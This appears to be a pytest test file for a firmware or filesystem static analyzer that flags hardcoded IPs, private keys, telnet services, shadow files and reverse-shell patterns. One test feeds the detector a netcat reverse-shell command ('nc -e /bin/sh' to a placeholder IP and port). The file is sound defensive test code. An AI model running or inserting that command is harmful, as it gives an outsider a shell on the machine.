from pathlib import Path
from app.analyzers.static_rules import scan_text_for_indicators
from app.analyzers.static_analyzer import analyze_extracted_filesystem
from app.extraction.demo_filesystem import generate_demo_filesystem


def test_scan_detects_hardcoded_ip():
    findings = scan_text_for_indicators("connect to server at 203.0.113.55 for updates")
    categories = [item["category"] for item in findings]
    assert "hardcoded_ip" in categories


def test_scan_detects_private_key():
    findings = scan_text_for_indicators("-----BEGIN RSA PRIVATE KEY-----\nMIIExample\n-----END RSA PRIVATE KEY-----")
    categories = [item["category"] for item in findings]
    assert "credential_exposure" in categories
    critical_findings = [item for item in findings if item["severity"] == "CRITICAL"]
    assert len(critical_findings) > 0


def test_scan_detects_reverse_shell_pattern():
    findings = scan_text_for_indicators("nc -e /bin/sh 203.0.113.55 4444")
    categories = [item["category"] for item in findings]
    assert "reverse_shell" in categories


def test_scan_detects_telnet_service():
    findings = scan_text_for_indicators("starting telnetd on port 23")
    categories = [item["category"] for item in findings]
    assert "network_service" in categories


def test_scan_returns_empty_for_benign_text():
    findings = scan_text_for_indicators("this is a normal configuration file with no risk indicators present")
    assert isinstance(findings, list)


def test_analyze_extracted_filesystem_detects_shadow_file(tmp_path):
    target_dir = tmp_path / "demo_fs"
    generate_demo_filesystem(target_dir)
    findings = analyze_extracted_filesystem(target_dir)
    credential_findings = [item for item in findings if item["category"] == "credential_file"]
    assert len(credential_findings) > 0


def test_analyze_extracted_filesystem_handles_missing_directory(tmp_path):
    missing_dir = tmp_path / "does_not_exist"
    findings = analyze_extracted_filesystem(missing_dir)
    assert findings == []
